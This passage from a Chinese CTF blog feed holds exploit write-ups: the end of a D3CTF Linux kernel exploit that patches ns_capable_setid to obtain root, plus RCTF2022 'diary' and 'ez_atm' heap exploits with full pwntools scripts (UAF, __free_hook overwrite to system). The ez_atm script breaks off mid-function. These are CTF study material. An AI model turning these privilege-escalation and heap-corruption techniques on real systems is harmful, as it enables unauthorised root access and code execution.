class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">             * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>,</span><br><span class="line">                   <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span></span><br><span class="line">                   <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span></span><br><span class="line">                   <span class="string">&quot;\xc3&quot;</span>,</span><br><span class="line">                   <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524153518128.png"                      alt="image-20230524153518128"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524160032198.png"                      alt="image-20230524160032198"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524162232568.png"                      alt="image-20230524162232568"                ></p><h3 id="本人当时做的笨办法"><a href="#本人当时做的笨办法" class="headerlink" title="本人当时做的笨办法"></a>本人当时做的笨办法</h3><p>因为当时注意到存在<code>off by null</code>漏洞，第一反应就是利用<code>msg_msg</code>结构体来做这道题。属于是瞎猫碰到死耗子，我在没有考虑页级堆风水的情况下申请的<code>msg_msg</code>的<code>order</code>正好为3，也导致有一定的几率能够达到UAF的效果。自然，我的第一反应也是修改<code>cred</code>结构体，虽然能够成功找到但是成功率十分的低，每次调试需要手动跑二十多分钟，因为内存中有一大块存放着各种指针，导致无法继续往下搜索出现<code>kernel panic</code>，并且在改回普通用户权限后出现了这篇文章开头部分提到的<code>io_uring</code>的问题，所以也就放弃了这一方法。</p><p>然而，因为当时不清楚CFI的作用又跑去改ops去了，调了半天发现永远会在最后一步造成<code>panic</code>，并且也没有找到可以用来实现栈迁移的<code>gadget</code>，所以这个方法也被放弃了。刚刚结束比赛看了NULL的wp之后就觉得自己是真的太蠢了，分明可以直接修改<code>pipe_buffer</code>了居然没有想到<code>Dirty Pipe</code>，虽然墨晚鸢佬说这不是最优解，但是是我唯一能够做出来的方法我居然没想到，我是真的蠢！！！</p><hr><p>参考链接：</p><p>​    <a class="link"   href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation" >https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v6.2.12/source" >https://elixir.bootlin.com/linux/v6.2.12/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img  
                     lazyload
                     src=&quot;/images/loading.svg&quot;
                     data-src=&quot;/images/image-20230510</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
    <category term="页级堆风水" scheme="https://cv196082.gitee.io/tags/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2022复现</title>
    <link href="https://cv196082.gitee.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-22T05:35:06.000Z</published>
    <updated>2023-04-24T12:39:40.207Z</updated>
    
    <content type="html"><![CDATA[<h2 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h2><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>就是一道很正常的用户态堆题。在<code>delete</code>函数中存在UAF漏洞。</p><p>不过题目的逆向过程比较麻烦，加之我开始没注意到题目已经给了输入command的格式，如果注意到的话动态调试来逆向更为简单。</p><p>题目很简单，利用UAF使得<code>tcache</code>和<code>unsorted bin</code>中同时存在一个chunk，泄漏出libc地址。利用<code>encrypt</code>函数分配到<code>unsorted bin</code>中的chunk进而修改到tcache中chunk的fd指针指向<code>__free_hook</code>即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;add#1#1#1#1#1#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;update#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;show#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;delete#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">idx, offset, length</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(offset), <span class="built_in">str</span>(length))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    create(i, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">10</span>-i)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x13a30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">update(<span class="number">3</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+<span class="number">0x1eee48</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;update#0#&#x27;</span> + flat(free_hook-<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">encrypt(<span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x2c0</span>-<span class="number">0x16</span>))</span><br><span class="line">create(<span class="number">40</span>, <span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;add#1#1#1#1#1#41#&#x27;</span>+flat(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这道题我在下面这个位置这里破防了，一直无法<code>double free</code>我还以为是glibc中检查了又不报错，去翻了源码发现会有报错，这才看了题目这里居然有这样一个验证属于是有点儿恶心人了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_43CC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>), <span class="string">&quot;    &quot;</span>, <span class="number">4uLL</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_4194</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_43CC(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[](*(<span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-atm"><a href="#ez-atm" class="headerlink" title="ez_atm"></a>ez_atm</h2><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>题目难度依旧不是很大，但是我没想明白的是，一开始我可以gdb去调试服务端程序，但是后面却一直卡在accept了，有大佬知道的话可以留言告诉我一下怎么回事。也正是因为这道题目比较简单才可以在不调试的情况下直接打。</p><p>这道题逆向分析过程也不算很难，存在三处漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">stat_query</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数中返回的依旧是<code>0x84</code>个字节，所以就可以读取到返回地址也就是libc上的地址了，从而拿到libc地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, user_list[user_id]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二处跟第一处类似，不同的是这里是越界读取堆上的内容，那么可以泄漏出堆地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">cancellation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( check_passwrod(user_id, &amp;password) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)user_list[user_id]);</span><br><span class="line">      user_id = <span class="number">-1</span>;</span><br><span class="line">      reply_message(<span class="number">1</span>, (__int64)<span class="string">&quot;The target account has been cancelled.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">      reply_message(<span class="number">2</span>, (__int64)<span class="string">&quot;password error.Try again.&quot;</span>);</span><br><span class="line">    get_message();</span><br><span class="line">  &#125;</span><br><span class="line">  reply_message(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (__int64)<span class="string">&quot;The password has been entered incorrectly for more than 5 times, and your account has been frozen.&quot;</span>);</span><br><span class="line">  *(_DWORD *)(user_list[user_id] + <span class="number">0x2C</span>LL) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三处则是这里在free之后没有清空指针引起的UAF。</p><p>所以利用思路就是先泄漏libc地址，再泄漏heap地址，最后利用UAF篡改<code>tcache</code>中chunk的fd到<code>__free_hook</code>即可。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3339</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">random</span>):</span></span><br><span class="line">    <span class="keyword">if</span> random &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x30</span>+random</span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x62</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x63</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x64</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">14</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x65</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(seed))</span><br><span class="line">objdll = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">objdll.srand(seed)</span><br><span class="line">uuid = <span class="string">&#x27;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&#x27;</span></span><br><span class="line">uuid = <span class="built_in">list</span>(uuid)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1d</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">52</span> <span class="keyword">and</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">45</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) == <span class="number">0x78</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num &amp; <span class="number">3</span> | <span class="number">8</span>))</span><br><span class="line">uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line"><span class="built_in">print</span>(uuid)</span><br><span class="line">r.send(uuid)</span><br><span class="line">r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;new_account&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>).ljust(<span class="number">0x4</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancellation</span>(<span class="params">password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;cancellation&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;login&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_pwd</span>(<span class="params">old_password, new_password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;update_pwd&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    